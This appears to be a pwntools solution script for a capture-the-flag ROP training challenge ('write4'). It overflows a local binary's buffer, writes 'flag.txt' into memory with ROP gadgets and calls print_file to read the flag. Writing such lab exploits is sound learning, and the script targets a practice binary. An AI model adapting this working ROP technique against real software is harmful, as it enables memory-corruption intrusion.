#!/usr/bin/python3

from pwn import *

pop_gaget 	= p64(0x0000000000400690)
write_gaget 	= p64(0x0000000000400628)
pop_rdi 	= p64(0x00400693)
write_loc 	= 0x601028
print_file 	= p64(0x00400510)
back_junk 	= b"B" * 20

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2


"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
def string_place(write_string, write_start):
	returnPayload = b""
	for i in range(0, len(write_string), 8):
		returnPayload += pop_gaget
		#destination
		returnPayload += p64( write_start+ (i))
		temp = write_string[i:i+8] 
		temp += b"\x00" * ( 8 - len(temp) )
		returnPayload += temp
		returnPayload += write_gaget

	return returnPayload

"""
Place the value for the first args of a function
"""
def first_arg(var):
	returnPayload = pop_rdi
	returnPayload += p64(var)
	return returnPayload


io = process('./write4')

# This is the vaddr of system
# First return to the location of the pop rdi
# 4   0x00400510 GLOBAL FUNC       print_file
#Fill up the buffer and the base pointer
payload = junk + new_bp

payload += string_place(b"flag.txt", write_loc)

# This is the vaddr of system
# First return to the location of the pop rdi
payload += first_arg(write_loc)
payload += print_file

payload += back_junk

print("The payload is:")
print(payload)
print("Payload size is:" + str(len(payload)))
input("Hit enter to apptempt exploit")

print(io.clean(0.5).decode("utf-8"))
io.send(payload)
input("exploit sent hit enter to end")
print(io.clean(0.5).decode("utf-8"))

sleep(1)

f = open('./payload', 'wb')
f.write(payload)
f.close()
